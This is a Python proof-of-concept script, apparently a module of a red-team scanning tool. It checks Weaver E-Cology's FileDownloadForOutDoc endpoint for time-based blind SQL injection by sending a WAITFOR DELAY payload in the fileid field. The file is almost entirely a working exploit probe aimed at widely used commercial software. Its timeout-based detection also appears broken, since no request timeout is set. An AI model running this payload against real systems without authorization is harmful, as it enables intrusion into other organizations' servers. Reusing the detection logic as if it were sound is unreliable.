'''
Function:
    泛微E-Cology FileDownloadForOutDoc SQL注入
Author:
    spmonkey，夜梓月
Wechat official account：
    中龙 红客突击队
Official website：
    https://www.hscsec.cn/
Email：
    spmonkey@hscsec.cn
Blog:
    https://spmonkey.github.io/
GitHub:
    https://github.com/spmonkey/
'''
# -*- coding: utf-8 -*-
import requests
import os
import sys
from urllib.parse import urlparse
from requests.packages.urllib3 import disable_warnings
disable_warnings()
path = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.append(path)
from modules import get_user_agent


class poc:
    def __init__(self, url, proxies):
        self.url = url
        self.headers = {
            'User-Agent': get_user_agent.get_user_agent(),
        }
        self.result_text = ""
        self.request_headers = ""
        self.value_list = []
        self.proxies = proxies

    def host(self):
        url = urlparse(self.url)
        netloc = url.netloc
        scheme = url.scheme
        return netloc, scheme

    def vuln(self, netloc, scheme):
        url = "{}://{}/weaver/weaver.file.FileDownloadForOutDoc".format(scheme, netloc)
        data = {
            "fileid": "2+WAITFOR+DELAY+'0:0:5'",
            "isFromOutImg": "1"
        }
        try:
            result = requests.post(url=url, data=data, headers=self.headers, verify=False, proxies=self.proxies)
            for request_type, request_text in dict(result.request.headers).items():
                self.request_headers += "                 {}: {}".format(request_type, request_text)
            return False
        except Exception as e:
            if "time out" in str(e):
                target = urlparse(url)
                self.result_text += """\n        [+]    \033[32m检测到目标站点存在SQL注入漏洞\033[0m
                 POST {} HTTP/1.1
                 Host: {}
    {}""".format(target.path, target.netloc, self.request_headers)
                for param, value in data.items():
                    values = param + "=" + value
                    self.value_list.append(values)
                self.result_text += "\n\n                 {}".format("&".join(self.value_list))
                return True
            else:
                return False

    def main(self):
        all = self.host()
        netloc = all[0]
        scheme = all[1]
        if self.vuln(netloc, scheme):
            return self.result_text
        else:
            return False
